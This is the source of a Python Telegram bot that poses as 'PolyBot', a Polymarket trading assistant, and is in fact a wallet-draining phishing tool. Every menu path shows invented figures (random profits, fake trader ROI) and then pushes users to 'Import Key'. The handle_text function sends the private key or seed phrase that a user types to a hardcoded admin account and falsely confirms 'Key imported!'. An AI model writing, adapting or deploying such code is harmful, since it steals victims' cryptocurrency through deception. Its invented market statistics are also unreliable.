from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is alive')

def run_web():
    server = HTTPServer(('0.0.0.0', 10000), Handler)
    server.serve_forever()

threading.Thread(target=run_web).start()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)

import os
import random
import string

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8357823603


# =========================
# KEYBOARDS
# =========================

def home_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Markets", callback_data="markets"),
         InlineKeyboardButton("🤖 Copy Trade", callback_data="copy")],
        [InlineKeyboardButton("📁 Portfolio", callback_data="portfolio"),
         InlineKeyboardButton("💼 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("🧠 Smart Wallets", callback_data="smart"),
         InlineKeyboardButton("📌 Limit Orders", callback_data="limit")],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])


def import_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Import Key", callback_data="import_key")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
    ])


def market_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Politics", callback_data="m_politics"),
         InlineKeyboardButton("Sports", callback_data="m_sports")],
        [InlineKeyboardButton("Crypto", callback_data="m_crypto"),
         InlineKeyboardButton("Trump", callback_data="m_trump")],
        [InlineKeyboardButton("Finance", callback_data="m_finance"),
         InlineKeyboardButton("Geopolitics", callback_data="m_geo")],
        [InlineKeyboardButton("Volume", callback_data="m_volume"),
         InlineKeyboardButton("Trending", callback_data="m_trending")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
    ])


def copy_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Copy Trade", callback_data="copy_add"),
         InlineKeyboardButton("📊 Activity", callback_data="copy_activity")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
    ])


# =========================
# START
# =========================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    context.user_data.clear()

    await update.message.reply_text(
        "✅ Welcome to PolyBot\nYour secure companion for rapid Polymarket trades.\n\nGet Started. Select a function:",
        reply_markup=home_kb()
    )


# =========================
# MESSAGE EDIT HELPER
# =========================

async def edit(query, text, keyboard):
    await query.message.edit_text(text, reply_markup=keyboard)


# =========================
# CALLBACK HANDLER
# =========================

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query
    await query.answer()

    data = query.data

    # 🔥 CLEANUP BLOCK (THIS IS CORRECT PLACE)
    if context.user_data.get("key_msg_id"):
        try:
            await context.bot.delete_message(
                chat_id=query.message.chat_id,
                message_id=context.user_data["key_msg_id"]
            )
        except:
            pass

        context.user_data.pop("key_msg_id", None)
        context.user_data["awaiting_key"] = False

    # HOME
    if data == "home":
        await edit(query, "🏠 Main Menu", home_kb())


    # =========================
    # MARKETS
    # =========================
    elif data == "markets":
        await edit(query,
            "📊 Market Search\n\nChoose a category:",
            market_kb()
        )

    elif data.startswith("m_"):
        await edit(query,
            "🔒 Access restricted.\n\n❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # COPY TRADE
    # =========================
    elif data == "copy":
        await edit(query,
            "🤖 Copy Trading\n\n"
            "Top Traders Available:\n\n"
            "👤 AlphaSignals\nROI: +124%\nWin Rate: 78%\nFollowers: 1,245\n\n"
            "👤 QuantumTrades\nROI: +98%\nWin Rate: 74%\nFollowers: 980\n\n"
            "Start by choosing a trader.",
            copy_kb()
        )

    elif data in ["copy_add", "copy_activity"]:
        await edit(query,
            "⚠️ Feature Currently Available\n\nPlease deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # PORTFOLIO
    # =========================
    elif data == "portfolio":
        await edit(query,
            "📁 You have no open positions.",
            InlineKeyboardMarkup([
                [InlineKeyboardButton("View Assets", callback_data="p_assets")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
            ])
        )

    elif data.startswith("p_"):
        await edit(query,
            "⚠️ Feature Currently Available\n\nPlease deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # WALLET
    # =========================
    elif data == "wallet":
        await edit(query,
            "📁 Portfolio Overview\n\n"
            "Total Balance: $0.00\n"
            "Available: $0.00\n"
            "In Orders: $0.00\n\n"
            "Assets:\n- BTC: 0.00\n- ETH: 0.00\n\n"
            "You have no open positions.",
            InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit", callback_data="w_deposit"),
                 InlineKeyboardButton("Withdraw", callback_data="w_withdraw")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
            ])
        )

    elif data in ["w_deposit", "w_withdraw"]:
        await edit(query,
            "❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # SMART WALLET
    # =========================
    elif data == "smart":
        pnl = round(random.uniform(200, 2000), 2)

        await edit(query,
            f"🧠 Smart Wallet\n\n"
            f"Weekly PnL: +${pnl}\n"
            f"Strategy: AI Momentum\n"
            f"Risk Level: Medium\n"
            f"Active Trades: {random.randint(1,5)}\n\n"
            f"System optimized for current market.",
            InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ Continue", callback_data="smart_continue")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
            ])
        )

    elif data == "smart_continue":
        await edit(query,
            "🔒 To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # LIMIT ORDERS
    # =========================
    elif data == "limit":
        await edit(query,
            "You have no limit orders.",
            InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit", callback_data="limit_deposit")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
            ])
        )

    elif data == "limit_deposit":
        await edit(query,
            "❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # REFERRALS
    # =========================
    elif data == "referrals":
        code = ''.join(random.choices(string.ascii_uppercase, k=6))

        await edit(query,
            f"👥 Referral Program\n\n"
            f"Earn commissions when your referrals trade.\n\n"
            f"Your Code: {code}\n\n"
            f"🎁 Rewards:\n"
            f"- Earn 10% per referral trade\n"
            f"- Bonus $5 per active user\n"
            f"- Weekly leaderboard rewards\n\n"
            f"Invite more users to increase earnings.",
            InlineKeyboardMarkup([
                [InlineKeyboardButton("Withdraw", callback_data="ref_withdraw")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
            ])
        )

    elif data == "ref_withdraw":
        await edit(query,
            "❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # SETTINGS + HELP
    # =========================
    elif data in ["settings", "help"]:
        await edit(query,
            "❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
            import_kb()
        )


    # =========================
    # IMPORT KEY
    # =========================
    elif data == "import_key":
        context.user_data["awaiting_key"] = True

        msg = await query.message.reply_text("📝 Please provide the private key or the 12-24 words mnemonic phrase of your wallet that you wish to connect.")

        # store message id
        context.user_data["key_msg_id"] = msg.message_id

# =========================
# TEXT INPUT (KEY)
# =========================

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if context.user_data.get("awaiting_key"):
        context.user_data["awaiting_key"] = False

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"KEY from {update.effective_user.id}: {update.message.text}"
        )

        await update.message.reply_text("✅ Key imported!")


# =========================
# RUN
# =========================

app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(handle_buttons))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

print("Bot running...")
if __name__ == "__main__":
    try:
        print("Bot starting...")
        app.run_polling()
    except Exception as e:
        print("CRASH ERROR:", e)
